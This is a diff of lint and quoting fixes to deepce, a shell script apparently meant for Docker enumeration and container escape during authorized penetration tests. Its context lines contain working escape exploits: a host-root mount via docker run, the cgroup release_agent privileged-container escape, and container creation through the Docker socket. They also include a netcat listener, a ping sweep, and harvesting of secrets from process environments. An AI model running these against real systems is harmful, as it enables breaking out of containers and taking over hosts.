@@ -1,5 +1,6 @@
 #!/bin/sh
 
+# shellcheck disable=SC2034
 VERSION="v0.1.0"
 ADVISORY="deepce should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission."
 
@@ -129,6 +130,8 @@ USEFUL_CMDS="curl wget gcc nc netcat ncat jq nslookup host hostname dig python p
 ###########################################
 
 # Convert version numbers into a regular number so we can do simple comparisons.
+# shellcheck disable=SC2046
+# shellcheck disable=SC2183 # word splitting here is on purpose
 ver() { printf "%03d%03d%03d" $(echo "$1" | tr '.' ' '); }
 
 ###########################################
@@ -141,7 +144,7 @@ printer() {
     # Temporarily replace the IFS with null to preserve newline chars
     OLDIFS=$IFS
     IFS=
-    printf "$1$2$NC\n"
+    printf "%s%s%s\n" "$1" "$2" "$NC"
     # Restore it so we don't break anything else
     IFS=$OLDIFS
   fi
@@ -157,9 +160,9 @@ printSection() {
     s="$1"
   fi
   size=${#s}
-  no=$(expr $l - $size)
-  start=$(expr $no / 2)
-  end=$(expr $no - $start)
+  no=$(( "$l" - "$size"))
+  start=$(( "$no" / 2 ))
+  end=$(( "$no" - "$start"))
   printf "%s%${start}s" "$B" | tr " " "="
   printf "%s%s%s" "$GREEN" "$s" "$B"
   printf "%${end}s" | tr " " "="
@@ -464,9 +467,9 @@ containerIPs() {
 
 containerTools(){
   for CMD in ${CONTAINER_CMDS}; do
-    tools="$tools $(command -v ${CMD})"
+    tools="$tools $(command -v "${CMD}")"
   done
-  printResultLong "Container tools ........." "$(echo $tools | tr ' ' '\n')" "None"
+  printResultLong "Container tools ........." "$(echo "$tools" | tr ' ' '\n')" "None"
 }
 
 containerName() {
@@ -501,7 +504,7 @@ containerName() {
     fi
   fi
 
-  # TODO: Not found, alphine doesn't look to work
+  # TODO: Not found, alpine doesn't look to work
 }
 
 getContainerInformation() {
@@ -523,10 +526,10 @@ getContainerInformation() {
   printMsg "CPU ....................." "$cpuModel"
 
   for CMD in ${USEFUL_CMDS}; do
-    tools="$tools $(command -v ${CMD})"
+    tools="$tools $(command -v "${CMD}")"
   done
 
-  printResultLong "Useful tools installed .." "$(echo $tools | tr ' ' '\n')"
+  printResultLong "Useful tools installed .." "$(echo "$tools" | tr ' ' '\n')"
 }
 
 containerServices() {
@@ -541,6 +544,7 @@ containerServices() {
 
   (ps -aux 2>/dev/null || ps -a) | grep -v "grep" | grep -q "sshd"
 
+  # shellcheck disable=SC2181
   if [ $? -eq 0 ]; then
     if [ -f "/etc/ssh/sshd_config" ]; then
       sshPort=$(grep /etc/ssh/sshd_config  "^Port" || echo "Port 22" | cut -d' ' -f2)
@@ -577,7 +581,7 @@ containerExploits() {
     printSuccess "$alpineVersion"
     printQuestion "CVE-2019-5021 Vulnerable .."
 
-    if [ "$(ver $alpineVersion)" -ge "$(ver 3.3.0)" ] && [ "$(ver $alpineVersion)" -le "$(ver 3.6.0)" ]; then
+    if [ "$(ver "$alpineVersion")" -ge "$(ver 3.3.0)" ] && [ "$(ver "$alpineVersion")" -le "$(ver 3.6.0)" ]; then
       printYesEx
       printTip "$TIP_CVE_2019_5021"
     else
@@ -656,7 +660,7 @@ pingSweep() {
       # Ping all IPs in range
       set +m
       for addr in $(seq 1 1 10); do
-        (ping -c 1 -t 1 $subnet.$addr >/dev/null && echo $subnet.$addr is Up) & >/dev/null
+        (ping -c 1 -t 1 "$subnet.$addr" >/dev/null && echo "$subnet.$addr" is Up) & true >/dev/null
         pids="${pids} $!"
       done
 
@@ -729,13 +733,13 @@ findMountedFolders() {
 findInterestingFiles() {
   printSection "Interesting Files"
 
-  interstingVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -iq "$GREP_SECRETS")
+  interestingVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -iq "$GREP_SECRETS")
   boringVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -ivq "$GREP_SECRETS")
 
   printQuestion "Interesting environment variables ..."
-  if [ "$interstingVars" ]; then
+  if [ "$interestingVars" ]; then
     printYes
-    printSuccess "$interstingVars"
+    printSuccess "$interestingVars"
   else
     printNo
   fi
@@ -754,6 +758,7 @@ findInterestingFiles() {
   if [ -x "$(command -v find)" ]; then
     find / -maxdepth 1 -type f | grep -v "/.dockerenv"
   else
+    # shellcheck disable=SC2010
     ls -lah / | grep -v '^d\|^l\|^total\|.dockerenv'
   fi
   nl
@@ -768,7 +773,7 @@ findInterestingFiles() {
   homeDirs="$(ls -lAh /home)"
   printQuestion "Home directories ...................."
 
-  if [ "$(echo $homeDirs | grep -v 'total 0')" ]; then
+  if echo "$homeDirs" | grep -qv 'total 0'; then
     printStatus "$homeDirs"
   else
     printNo
@@ -792,7 +797,7 @@ findInterestingFiles() {
   for p in ${PATH_APPS}; do
     if [ -f "$p" ]; then
       printSuccess "$p"
-      printMsg "$(ls -lAh $p)"
+      printMsg "$(ls -lAh "$p")"
     fi
   done
 
@@ -827,7 +832,7 @@ checkDockerVersionExploits() {
   fi
 
   printQuestion "CVE–2019–13139 .........."
-  if [ "$(ver $dockerVersion)" -lt "$(ver 18.9.5)" ]; then
+  if [ "$(ver "$dockerVersion")" -lt "$(ver 18.9.5)" ]; then
     printYesEx
     printTip "$TIP_CVE_2019_13139"
   else
@@ -835,7 +840,7 @@ checkDockerVersionExploits() {
   fi
 
   printQuestion "CVE–2019–5736 ..........."
-  if [ "$(ver $dockerVersion)" -lt "$(ver 18.9.3)" ]; then
+  if [ "$(ver "$dockerVersion")" -lt "$(ver 18.9.3)" ]; then
     printYesEx
     printTip "$TIP_CVE_2019_5736"
   else
@@ -906,7 +911,7 @@ prepareExploit() {
       # Enable job control
       set -m
       # Create listener
-      nc -lvnp $port &
+      nc -lvnp "$port" &
       # PID_NC=$!
       bg
     fi
@@ -937,6 +942,7 @@ exploitDocker() {
   prepareExploit
   printQuestion "Exploiting"
   nl
+  # shellcheck disable=SC2086 # Word splitting is expected and allowed here
   docker run -v /:/mnt --rm -it alpine chroot /mnt $cmd
 
   printQuestion "Exploit complete ...."
@@ -961,12 +967,13 @@ exploitPrivileged() {
   prepareExploit
 
   # POC modified from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
+  # shellcheck disable=SC2012 # Not using find as it may not be available
   d=$(dirname "$(ls -x /s*/fs/c*/*/r* | head -n1)")
-  mkdir -p $d/w
-  echo 1 >$d/w/notify_on_release
+  mkdir -p "$d/w"
+  echo 1 >"$d/w/notify_on_release"
   t="$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)"
   touch /o
-  echo "$t/c" >$d/release_agent
+  echo "$t/c" >"$d/release_agent"
   printf "#!/bin/sh\n%s > %s/o" "$cmd" "$t">/c
   chmod +x /c
   sh -c "echo 0 >$d/w/cgroup.procs"
@@ -996,7 +1003,7 @@ exploitDockerSock() {
   nl
 
   # Create docker container using the docker sockx
-  payload="[\"/bin/sh\",\"-c\",\"chroot /mnt $cmd\"]" #
+  payload="[\"/bin/sh\",\"-c\",\"chroot /mnt $cmd\"]"
   response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"alpine\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
 
   if ! [ $? ]; then
